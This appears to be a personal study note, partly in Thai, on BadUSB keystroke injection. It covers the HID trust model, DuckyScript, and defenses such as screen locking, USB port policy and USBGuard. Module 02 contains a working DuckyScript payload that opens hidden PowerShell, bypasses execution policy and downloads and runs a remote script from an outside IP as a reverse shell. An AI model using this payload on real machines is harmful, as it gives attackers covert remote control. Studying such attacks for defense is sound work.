# ⚡ Hardware Hacking & BadUSB Keystroke Injection

> **Phase:** `Phase B — Scripting & Recon` | **Tags:** `#hardware` `#badusb` `#physical-security` `#duckyscript`  
> **Status:** ⏳ Upcoming | **Focus:** Keystroke Injection, Hak5 Hardware & Hot-plug Defense

---

## 📑 Core Modules Overview

- [ ] [[#Module 01: Physical Security & HID Trust Model|Module 01: Physical Security & HID Trust Model]]
- [ ] [[#Module 02: DuckyScript Payloads & Execution|Module 02: DuckyScript Payloads & Execution]]
- [ ] [[#Module 03: Hardware Attack Mitigations|Module 03: Hot-plug Attack Mitigations]]

---

## Module 01: Physical Security & HID Trust Model
- **Status:** ⏳ Not Started
- **Core Concept:** คอมพิวเตอร์ทุกเครื่องถูกออกแบบมาให้เชื่อใจ 'คีย์บอร์ด' (Human Interface Device - HID) 100% โดยไม่มีการตรวจสอบสิทธิ์ BadUSB คือฮาร์ดแวร์ที่ปลอมตัวเป็นคีย์บอร์ดแล้วพิมพ์คำสั่งโจมตีด้วยความเร็ว 1,000 คำต่อนาที

---

## Module 02: DuckyScript Payloads & Execution
- **Status:** ⏳ Not Started
- **Core Concept:** ไวยากรณ์ DuckyScript ในการสั่งเปิด Command Prompt/PowerShell ดาวน์โหลด Payload และปิดหน้าต่างพรางตัว

### 💻 Sample DuckyScript Payload
```text
REM [Target: Windows 10/11 - Open PowerShell & Execute In-Memory Reverse Shell]
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Exec Bypass -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/payload.ps1')"
ENTER
```

---

## Module 03: Hardware Attack Mitigations
- **Status:** ⏳ Not Started
- **Core Concept:** การป้องกันทางกายภาพ: การล็อกหน้าจอเมื่อไม่อยู่ (`Win + L`), การปิดพอร์ต USB ที่ไม่จำเป็นผ่าน Group Policy (GPO), และการใช้ซอฟต์แวร์ USBGuard บน Linux

### 🧠 Feynman Takeaway & Reflection
#### 💡 แก่นความคิดและกลไกสำคัญ (Core Mental Models)

#### ⚠️ กับดักทางเทคนิคและข้อควรระวัง (Gotchas & Pitfalls)
